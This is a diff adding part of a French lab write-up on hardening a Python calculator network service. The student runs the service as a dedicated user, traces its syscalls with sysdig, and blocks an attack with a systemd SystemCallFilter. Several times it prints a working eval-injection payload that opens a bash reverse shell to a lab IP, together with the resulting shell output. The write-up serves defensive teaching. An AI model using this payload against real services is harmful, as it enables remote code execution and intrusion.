@@ -1105,3 +1105,179 @@ uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_serv
 La fonction vulnérable est donc ``eval()`` car il n'y a aucun filtre, l'utilisateur peut injecter n'importe quel payload.
 
 Ici le payload qu'on utilise est : ``__import__('os').system('bash -i >& /dev/tcp/172.27.206.51/4444 0>&1')`` afin d'avoir un reverse shell en tant que root.
+
+🌞 Prouvez que le service s'exécute actuellement en root
+
+```
+[fmaxance@vbox ~]$ systemctl status calculatrice.service
+● calculatrice.service - Super serveur calculatrice
+     Loaded: loaded (/etc/systemd/system/calculatrice.service; static)
+     Active: active (running) since Thu 2025-03-27 14:26:44 CET; 5min ago
+   Main PID: 1327 (python3)
+      Tasks: 1 (limit: 23155)
+     Memory: 3.3M
+        CPU: 18ms
+     CGroup: /system.slice/calculatrice.service
+             └─1327 /usr/bin/python3 /opt/calc.py
+
+Mar 27 14:26:44 vbox systemd[1]: Started Super serveur calculatrice.
+
+[fmaxance@vbox ~]$ ps aux | grep root | grep calc.py
+root        1327  0.0  0.2  10904  8576 ?        Ss   14:26   0:00 /usr/bin/python3 /opt/calc.py
+```
+
+🌞 Créer l'utilisateur calculatrice
+
+```
+[fmaxance@vbox ~]$ sudo useradd --system --no-create-home --shell /sbin/nologin calculatrice
+[sudo] password for fmaxance:
+[fmaxance@vbox ~]$ getent passwd calculatrice
+calculatrice:x:995:992::/home/calculatrice:/sbin/nologin
+```
+
+🌞 Adaptez les permissions
+
+```
+[fmaxance@vbox ~]$ sudo chown calculatrice:calculatrice /opt/calc.py
+[fmaxance@vbox ~]$ sudo chmod 500 /opt/calc.py
+[fmaxance@vbox ~]$ ls -la /opt/calc.py
+-r-x------. 1 calculatrice calculatrice 659 Mar 19 15:09 /opt/calc.py
+```
+
+🌞 Modifier le .service
+
+```
+[fmaxance@vbox ~]$ systemctl status calculatrice.service
+● calculatrice.service - Super serveur calculatrice
+     Loaded: loaded (/etc/systemd/system/calculatrice.service; static)
+     Active: active (running) since Thu 2025-03-27 14:38:23 CET; 35s ago
+   Main PID: 1433 (python3)
+      Tasks: 1 (limit: 23155)
+     Memory: 3.3M
+        CPU: 13ms
+     CGroup: /system.slice/calculatrice.service
+             └─1433 /usr/bin/python3 /opt/calc.py
+
+Mar 27 14:38:23 vbox systemd[1]: Started Super serveur calculatrice.
+
+[fmaxance@vbox ~]$ sudo cat /etc/systemd/system/calculatrice.service
+[Unit]
+Description=Super serveur calculatrice
+
+[Service]
+User=calculatrice
+Group=calculatrice
+ExecStart=/usr/bin/python3 /opt/calc.py
+Restart=always
+```
+
+🌞 Prouvez que le service s'exécute désormais en tant que calculatrice
+
+```
+[fmaxance@vbox ~]$ systemctl status calculatrice.service
+● calculatrice.service - Super serveur calculatrice
+     Loaded: loaded (/etc/systemd/system/calculatrice.service; static)
+     Active: active (running) since Thu 2025-03-27 14:40:34 CET; 1min 35s ago
+   Main PID: 1467 (python3)
+      Tasks: 1 (limit: 23155)
+     Memory: 3.3M
+        CPU: 12ms
+     CGroup: /system.slice/calculatrice.service
+             └─1467 /usr/bin/python3 /opt/calc.py
+
+Mar 27 14:40:34 vbox systemd[1]: Started Super serveur calculatrice.
+
+[fmaxance@vbox ~]$ ps aux | grep calcula | grep calc.py
+calcula+    1467  0.0  0.2  10844  8192 ?        Ss   14:40   0:00 /usr/bin/python3 /opt/calc.py
+```
+
+🌞 Tracez l'exécution de l'application : normal
+
+```
+[fmaxance@vbox ~]$ sudo sysdig proc.name=python3 -w calc.scap
+
+```
+
+```
+fmaxance@MSI:~$ nc 10.1.1.12 13337
+Hello3+3
+6Hello6-6
+0Hello8/2
+4.0Hello4%2
+0Hello5*4
+20Hello^C
+fmaxance@MSI:~$
+```
+
+```
+[fmaxance@vbox ~]$ sysdig -r calc.scap | cut -d' ' -f7 | sort | uniq | tr -s '\n' ' '
+accept4 access arch_prctl bind brk close dup epoll_create1 execve exit_group fcntl fstat futex getdents64 getegid geteuid getgid getpeername getrandom getsockname getuid ioctl listen lseek mmap mprotect munmap newfstatat openat pread prlimit procexit read readlink recvfrom rseq rt_sigaction sendto set_robust_list setsockopt set_tid_address socket switch sysinfo write
+```
+
+🌞 Tracez l'exécution de l'application : hack
+
+```
+[fmaxance@vbox ~]$ sudo sysdig proc.name=python3 -w Hackcalc.scap
+
+```
+
+```
+fmaxance@MSI:~$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+
+```
+
+```
+fmaxance@MSI:~$ echo "__import__('os').system('bash -i >& /dev/tcp/172.27.206.51/4444 0>&1')" | nc 10.1.1.12 13337
+Hello
+```
+
+```
+fmaxance@MSI:~$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 172.27.192.1 32902
+bash: cannot set terminal process group (1565): Inappropriate ioctl for device
+bash: no job control in this shell
+bash-5.1$ id
+id
+uid=995(calculatrice) gid=992(calculatrice) groups=992(calculatrice) context=system_u:system_r:unconfined_service_t:s0
+bash-5.1$
+```
+
+```
+[fmaxance@vbox ~]$ sysdig -r Hackcalc.scap | cut -d' ' -f7 | sort | uniq | tr -s '\n' ' '
+accept4 access arch_prctl bind brk clone3 close dup epoll_create1 execve exit_group fcntl fstat futex getdents64 getegid geteuid getgid getpeername getrandom getsockname getuid ioctl listen lseek mmap mprotect munmap newfstatat openat pread prlimit procexit read readlink recvfrom rseq rt_sigaction rt_sigprocmask sendto set_robust_list setsockopt set_tid_address signaldeliver socket switch sysinfo wait4 write
+```
+
+On remarque 4 nouveaux syscalls uniquement présent lors du Hack de l'application calc.py : ``clone3``, ``rt_sigprocmask``, ``signaldeliver``, ``wait4``
+
+🌞 Adaptez le .service
+
+```
+[fmaxance@vbox ~]$ sudo cat /etc/systemd/system/calculatrice.service
+[Unit]
+Description=Super serveur calculatrice
+
+[Service]
+User=calculatrice
+Group=calculatrice
+ExecStart=/usr/bin/python3 /opt/calc.py
+Restart=always
+SystemCallFilter=~clone3 rt_sigprocmask signaldeliver wait4
+```
+
+```
+fmaxance@MSI:~$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+
+```
+
+```
+fmaxance@MSI:~$ echo "__import__('os').system('bash -i >& /dev/tcp/172.27.206.51/4444 0>&1')" | nc 10.1.1.12 13337
+Hellofmaxance@MSI:~$ nc 10.1.1.12 13337
+Hello3+3
+6Hello9%2
+1Hello^C
+```
+
+L'exploitation est devenue plus compliquée car lorsqu'on veut injecter le payload, le nc est directement coupé. Mais lors d'une utilisation normal de la calculatrice, tout fonctionne.
